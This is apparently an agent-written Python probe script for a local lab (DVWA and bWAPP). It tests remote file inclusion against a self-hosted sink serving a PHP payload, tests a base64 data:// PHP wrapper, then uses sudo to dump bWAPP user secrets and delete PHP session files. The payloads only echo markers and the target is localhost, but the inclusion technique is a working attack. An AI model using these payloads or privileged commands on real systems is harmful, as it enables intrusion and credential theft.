#!/usr/bin/env python3
# loop3 t4 probe12: B1 RFI 阴性对照 + 最终状态核查 + 会话残留清理
import json, re, subprocess, time, datetime, os, threading
from http.server import BaseHTTPRequestHandler, HTTPServer
import requests

BASE = "http://127.0.0.1"
UA = "loop3-t4/1.0 (authorized local lab)"
GAP = 1.2
PORT = 8099
LOG = "/tmp/loop3-t4-probe12-sink.jsonl"
OUT = {"ts": datetime.datetime.now().isoformat(), "steps": []}


def rec(step_name, **kw):
    OUT["steps"].append({"step": step_name, **kw})
    print(f"--- {step_name}: " + json.dumps(kw, ensure_ascii=False)[:900], flush=True)
    return kw


def sh(c):
    r = subprocess.run(c, shell=True, capture_output=True, text=True)
    return (r.stdout + r.stderr).strip()


class Sink(BaseHTTPRequestHandler):
    def do_GET(self):
        e = {"at": datetime.datetime.now().isoformat(), "path": self.path, "headers": dict(self.headers)}
        open(LOG, "a").write(json.dumps(e) + "\n")
        print("SINK_HIT " + json.dumps(e)[:300], flush=True)
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b"<?php echo 'RFI-SHELL-LOOP3-7788'; ?>")

    def log_message(self, *a):
        pass


srv = HTTPServer(("127.0.0.1", PORT), Sink)
threading.Thread(target=srv.serve_forever, daemon=True).start()
time.sleep(0.4)

S = requests.Session()
S.headers["User-Agent"] = UA
S.cookies.set("security", "low", domain="127.0.0.1", path="/")
r = S.get(BASE + "/dvwa/login.php", timeout=20)
m = re.search(r"name='user_token' value='([^']+)'", r.text)
time.sleep(GAP)
S.post(BASE + "/dvwa/login.php",
       data={"username": "admin", "password": "password", "Login": "Login", "user_token": m.group(1)},
       allow_redirects=False, timeout=20)
rec("login", phpsessid=S.cookies.get("PHPSESSID"))

time.sleep(GAP)
payload = "http://127.0.0.1:%d/shell.txt" % PORT
r = S.get(BASE + "/dvwa/vulnerabilities/fi/", params={"page": payload}, timeout=20)
hits = sum(1 for _ in open(LOG)) if os.path.exists(LOG) else 0
rec("B1_RFI_attempt", payload=payload, status=r.status_code,
    executed=("RFI-SHELL-LOOP3-7788" in r.text), sink_hits=hits,
    err_in_body=bool(re.search(r"(failed to open stream|allow_url_include|Warning|Fatal)", r.text)),
    body_snippet=re.sub(r"\s+", " ", r.text[:300]),
    note="allow_url_include=Off 预期阻断；sink_hits=0 表示运行时未发起外连")
time.sleep(GAP)
# data:// 包装器对照
r = S.get(BASE + "/dvwa/vulnerabilities/fi/",
          params={"page": "data://text/plain;base64,PD9waHAgZWNobyAnRFJBVEEtTE9PUDMtOTkwMCc7ID8+"}, timeout=20)
rec("B1_data_wrapper_attempt", status=r.status_code, executed=("DRATA-LOOP3-9900" in r.text),
    body_snippet=re.sub(r"\s+", " ", r.text[:200]))

srv.shutdown()
rec("sink_hits_total", n=sum(1 for _ in open(LOG)) if os.path.exists(LOG) else 0)

# ---------------- 最终状态核查 ----------------
rec("final_docroot", v=sh("ls -la /var/www/html/"))
rec("final_teaching_endpoint", http=requests.get(BASE + "/lo3-teach/noent.php", timeout=10).status_code)
rec("final_bwapp_users", v=sh("sudo -n mariadb -N -e \"SELECT id,login,secret FROM bWAPP.users;\""))
rec("final_bwapp_blog_count", v=sh("sudo -n mariadb -N -e \"SELECT COUNT(*) FROM bWAPP.blog;\""))
rec("final_dvwa_guestbook", v=sh("sudo -n mariadb -N -e \"SELECT comment_id,name FROM dvwa.guestbook;\""))
rec("final_dvwa_users", v=sh("sudo -n mariadb -N -e \"SELECT user_id,user FROM dvwa.users;\""))
rec("final_services", v=sh("systemctl is-active apache2 mariadb; sudo -n ss -tlnp | grep -E ':80 |:3306|:8099'"))
rec("sink_port_closed", v=sh("ss -tln | grep 8099 || echo '8099 closed'"))
# 清理我为会话固定测试创建的会话文件（仅命名可识别的 loop3 测试会话）
rec("session_files_before", v=sh("sudo -n ls /var/lib/php/sessions/ | grep -iE 'loop3|036dd2f5|4a2a' || echo none"))
rec("session_cleanup", v=sh("sudo -n rm -f /var/lib/php/sessions/sess_loop3t4fixedsessionid000000000001 "
                            "/var/lib/php/sessions/sess_loop3fixlow0000000000000000000001 "
                            "/var/lib/php/sessions/sess_036dd2f56fcc1ec3e5538e1643d3f51e; "
                            "sudo -n ls /var/lib/php/sessions/ | grep -iE 'loop3|036dd2f5' || echo 'loop3 test sessions removed'"))
rec("session_files_after", v=sh("sudo -n ls -la /var/lib/php/sessions/ | wc -l"))

with open("/tmp/loop3-t4-probe12.json", "w") as f:
    json.dump(OUT, f, ensure_ascii=False, indent=1)
print(json.dumps({"rc": "ok"}))
